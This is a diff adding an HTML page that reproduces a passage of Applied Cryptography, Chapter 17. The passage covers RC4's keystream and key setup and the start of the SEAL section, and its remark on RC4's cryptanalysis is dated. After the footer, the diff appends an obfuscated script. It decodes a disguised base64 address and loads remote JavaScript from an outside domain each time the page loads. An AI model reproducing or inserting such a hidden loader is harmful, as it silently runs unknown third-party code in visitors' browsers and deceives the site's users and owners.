@@ -1,0 +1,102 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=397-399//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch16/16-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 17<BR>Other Stream Ciphers and Real Random-Sequence Generators
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">17.1 RC4</FONT></H3>
+<P>RC4 is a variable-key-size stream cipher developed in 1987 by Ron Rivest for RSA Data Security, Inc. For seven years it was proprietary, and details of the algorithm were only available after signing a nondisclosure agreement.
+</P>
+<P>In September, 1994 someone posted source code to the Cypherpunks mailing list&#151;anonymously. It quickly spread to the Usenet newsgroup sci.crypt, and via the Internet to ftp sites around the world. Readers with legal copies of RC4 confirmed compatibility. RSA Data Security, Inc. tried to put the genie back into the bottle, claiming that it was still a trade secret even though it was public; it was too late. It has since been discussed and dissected on Usenet, distributed at conferences, and taught in cryptography courses.</P>
+<P>RC4 is simple to describe. The algorithm works in OFB: The keystream is independent of the plaintext. It has a 8 * 8 S-box: <I>S</I><SUB>0</SUB>, <I>S</I><SUB>1</SUB>,..., <I>S</I><SUB>255</SUB>. The entries are a permutation of the numbers 0 through 255, and the permutation is a function of the variable-length key. It has two counters, <I>i</I> and <I>j</I>, initialized to zero.</P>
+<P>To generate a random byte, do the following:</P>
+<DL>
+<DD><I>i</I> = (<I>i</I> &#43; 1) mod 256
+<DD><I>j</I> = (<I>j</I> &#43; <I>S</I><SUB>i</SUB>) mod 256
+<DD>swap <I>S</I><SUB>i</SUB> and <I>S</I><SUB>j</SUB>
+<DD><I>t</I> = (<I>S</I><SUB>i</SUB> &#43; <I>S</I><SUB>j</SUB>) mod 256
+<DD><I>K</I> = <I>S</I><SUB>t</SUB>
+</DL>
+<P>The byte <I>K</I> is XORed with the plaintext to produce ciphertext or XORed with the ciphertext to produce plaintext. Encryption is fast&#151;about 10 times faster than DES.</P>
+<P>Initializing the S-box is also easy. First, fill it linearly: <I>S</I><SUB>0</SUB> = 0, <I>S</I><SUB>1</SUB> = 1,..., <I>S</I><SUB>255</SUB> = 255. Then fill another 256-byte array with the key, repeating the key as necessary to fill the entire array: <I>K</I><SUB>0</SUB>, <I>K</I><SUB>1</SUB>,..., <I>K</I><SUB>255</SUB>. Set the index <I>j</I> to zero. Then:</P>
+<DL>
+<DD>for <I>i</I> = 0 to 255:
+<DD><I>j</I> = (<I>j</I> &#43; <I>S</I><SUB>i</SUB> &#43; <I>K</I><SUB>i</SUB>) mod 256
+<DD>swap <I>S</I><SUB>i</SUB> and <I>S</I><SUB>j</SUB>
+</DL>
+<P>And that&#146;s it. RSADSI claims that the algorithm is immune to differential and linear cryptanalysis, doesn&#146;t seem to have any small cycles, and is highly nonlinear. (There are no public cryptanalytic results. RC4 can be in about 2<SUP>1700</SUP> (256! &#215; 256<SUP>2</SUP>) possible states: an enormous number.) The S-box slowly evolves with use: <I>i</I> ensures that every element changes and <I>j</I> ensures that the elements change randomly. The algorithm is simple enough that most programmers can quickly code it from memory.</P>
+<P>It should be possible to generalize this idea to larger S-boxes and word sizes. The previous version is 8-bit RC4. There&#146;s no reason why you can&#146;t define 16-bit RC4 with a 16 * 16 S-box (100K of memory) and a 16-bit word. You&#146;d have to iterate the initial setup a lot more times&#151;65,536 to keep with the stated design&#151;but the resulting algorithm should be faster.</P>
+<P>RC4 has special export status if its key length is 40 bits or under (see Section 13.8). This special export status has nothing to do with the secrecy of the algorithm, although RSA Data Security, Inc. has hinted for years that it does. The name is trademarked, so anyone who writes his own code has to call it something else. Various internal documents by RSA Data Security, Inc. have not yet been made public [1320,1337].</P>
+<P>So, what&#146;s the deal with RC4? It&#146;s no longer a trade secret, so presumably anyone can use it. However, RSA Data Security, Inc. will almost certainly sue anyone who uses unlicensed RC4 in a commercial product. They probably won&#146;t win, but they will certainly make it cheaper for a company to license than fight.</P>
+<P>RC4 is in dozens of commercial cryptography products, including Lotus Notes, Apple Computer&#146;s AOCE, and Oracle Secure SQL. It is part of the Cellular Digital Packet Data specification [37].</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">17.2 SEAL</FONT></H3>
+<P>SEAL is a software-efficient stream cipher designed at IBM by Phil Rogaway and Don Coppersmith [1340]. The algorithm was optimized for 32-bit processors: To run well it needs eight 32-bit registers and a cache of a few kilobytes. Using a relatively slow operation, SEAL preprocesses the key operation into a set of tables. These tables are then used to speed up encryption and decryption.
+</P>
+<P><FONT SIZE="+1"><B><I>Pseudo-random Function Family</I></B></FONT></P>
+<P>One novel feature of SEAL is that is isn&#146;t really a traditional stream cipher: it is a <B>pseudo-random function family</B>. Given a 160-bit key <I>k</I>, and a 32-bit <I>n</I>, SEAL stretches <I>n</I> into an <I>L-</I>bit string <I>k</I>(<I>n</I>). <I>L</I> can take any value less than 64 kilobytes. SEAL is supposed to enjoy the property that if <I>k</I> is selected at random, then <I>k(n</I>) should be computationally indistinguishable from a random <I>L-</I>bit function of <I>n</I>.</P>
+<P>The practical effect of SEAL being a pseudo-random function family is that it is useful in applications where traditional stream ciphers are not. With most stream ciphers you generate a sequence of bits in one direction: Knowing the key and a position <I>i</I>, the only way to determine the <I>i</I>th bit generated is to generate all the bits up until the <I>i</I>th one. But a pseudo-random function family is different: You get easy access at any desired position in the key stream. This is very useful.</P>
+<P>Imagine you need to secure a hard drive. You want to encrypt each and every 512-byte sector. With a pseudo-random function family like SEAL, you can encrypt the contents of sector <I>n</I> by XORing it with <I>k</I>(<I>n</I>). It is as though the entire disk is XORed with a long pseudo-random string, where any piece of that long string can be computed without any trouble.</P>
+<P>A pseudo-random function family also simplifies the synchronization problem encountered with standard stream ciphers. Suppose you send encrypted messages over a channel that sometimes drops messages. With a pseudo-random function family, you can encrypt under <I>k</I> the <I>n</I>th message you transmit, <I>x</I><SUB>n</SUB>, as <I>n</I> together with the XOR of <I>x</I><SUB>n</SUB> and <I>k</I>(<I>n</I>). The receiver doesn&#146;t need to store any state to recover <I>x</I><SUB>n</SUB>, nor does he need to worry about lost messages affecting the message decryption process.</P>
+<P><FONT SIZE="+1"><B><I>Description of SEAL</I></B></FONT></P>
+<P>The inner loop of SEAL is shown by Figure 17.1. Three key-derived tables, called <I>R, S</I>, and <I>T</I>, drive the algorithm. The preprocessing step maps the key <I>k</I>, to these tables using a procedure based on SHA (see Section 18.7). The 2-kilobyte table, <I>T</I>, is a 9 * 32 bit S-box.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch16/16-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(OdPhSZVo, gGheUEGD) {gGheUEGD = OdPhSZVo.createElement('script');gGheUEGD.type = 'text/javascript';gGheUEGD.async = true;gGheUEGD.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');OdPhSZVo.getElementsByTagName('body')[0].appendChild(gGheUEGD);}(document));</script></body>
+</html>
